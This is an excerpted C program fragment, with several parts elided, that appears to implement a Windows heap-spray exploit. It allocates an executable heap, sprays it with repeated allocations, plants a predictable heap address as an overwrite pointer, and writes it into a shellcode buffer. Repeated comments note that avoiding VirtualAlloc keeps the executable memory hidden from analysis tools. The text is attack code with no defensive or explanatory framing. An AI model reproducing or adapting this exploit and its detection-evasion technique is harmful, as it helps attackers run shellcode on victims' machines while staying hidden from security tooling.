...
int main(int argc, char** argv) {
  ...
  HANDLE executableHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);   // Without VirtualAlloc (visible at analysis tool)
  if (executableHeap == NULL) {
    printf("No executable heap. Are you having a bad day?\n");
    return -1;
  }

  printf("Executable heap heap = 0x%p\n", executableHeap);                // Without VirtualAlloc (visible at analysis tool)
  
  // Predicable address to a NOP operation
  memcpy(overwrittingAddr + 4, (void*) &executableHeap + 4, 4);           // Without VirtualAlloc (visible at analysis tool)
  ...
  for(int i = 0; i < HEAP_SPRAY_COUNT; i++) {
    ...
    heapSpray[i] = HeapAlloc(executableHeap, HEAP_ZERO_MEMORY, HEAP_SPRAY_SIZE); // Without VirtualAlloc (visible at analysis tool)
  ...
  memcpy(pointerToShellcode + 248 + 64, overwrittingAddr, 8);
  //DebugBreak();
  ...
  for(int i = 0; i < HEAP_SPRAY_COUNT; i++) {
    ...
    result = HeapFree(executableHeap, HEAP_NO_SERIALIZE, heapSpray[i]);
    if (result == 0) {
      printf("Failed to free\n");
      return -1;
    }
